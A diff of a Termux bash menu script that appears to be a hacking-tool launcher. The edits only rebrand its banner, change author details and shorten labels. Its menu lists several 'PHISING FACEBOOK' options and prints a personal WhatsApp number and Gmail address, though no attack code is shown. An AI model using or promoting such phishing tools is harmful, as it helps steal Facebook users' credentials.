@@ -2,7 +2,7 @@
 clear
 bi='\033[34;1m' #biru
 i='\033[32;1m' #ijo
-pur='\033[35;1m' #purple
+pur='\033[35;1m' #purpl
 cy='\033[36;1m' #cyan
 me='\033[31;1m' #merah
 pu='\033[37;1m' #putih
@@ -12,13 +12,13 @@ echo
 echo
 echo
 echo $i"["$bi"•"$i"]"$me"───────────────────────────────────────────"$i"["$bi"•"$i"]"
-echo $i" |"$cy"     DARK CYBER termux_ASSOCIATE"$i"         |"
+echo $i" |"$cy"     FIS CYBER 888251"$i"         |"
 echo $i" |"$me"─────────────────────────────────────────────"$i"|"
-echo $i" |"$pu" AUTHOR :"$ku" RADIUS Y MONIM  [FR13ND8]"$i"          |"
+echo $i" |"$pu" AUTHOR :"$ku" RADIUS MONIM  [888251]"$i"          |"
 echo $i" |"$pu" FACEBOOK :"$ku" RY Monim"$i"                   |"
 echo $i" |"$pu" THANKS TO :"$cy"~ [MR.P3RC1L] [MR.S∆MAx] [MR.B]"$i"  |"
 echo $i" |"$cy"            ~ [cyber] [%MR.S%] [AldykaPrygh]"$i" |"
-echo $i" |"$pu" Contack WhatsApp :"$ku" 082398824265"$i"             |"
+echo $i" |"$pu" Contack WhatsApp :"$ku" 0823988242--"$i"             |"
 echo $i" |"$pu" Contack Gmail :"$ku" monim26rady@gmail.com"$i"      |"
 echo $i"["$bi"•"$i"]"$me"───────────────────────────────────────────"$i"["$bi"•"$i"]"
 echo
@@ -43,7 +43,7 @@ echo $i"|"$me"15"$i" |"$cy" PHISING FACEBOOK 2       "$i"|"$i"    ────�
 echo $i"|"$me"16"$i" |"$cy" PHISING FACEBOOK 3       "$i"|"$i"    |"$cy" K"$i" |"
 echo $i"|"$me"17"$i" |"$cy" PHISING FACEBOOK 4       "$i"|"$i"    |"$cy" E"$i" |"
 echo $i"────────────────────────────────"$i"    |"$cy" R"$i" |"
-echo $i"|"$me"18"$i" |"$cy" INSTALL BAHAN DULU COEG  "$i"|"$i"    |"$cy" E"$i" |"
+echo $i"|"$me"18"$i" |"$cy" INSTALL BAHAN  "$i"|"$i"    |"$cy" E"$i" |"
 echo $i"|"$me"19"$i" |"$cy" KELUAR/EXIT PROGRAM      "$i"|"$i"    |"$cy" N"$i" |"
 echo $i"────────────────────────────────    ─────"
 echo
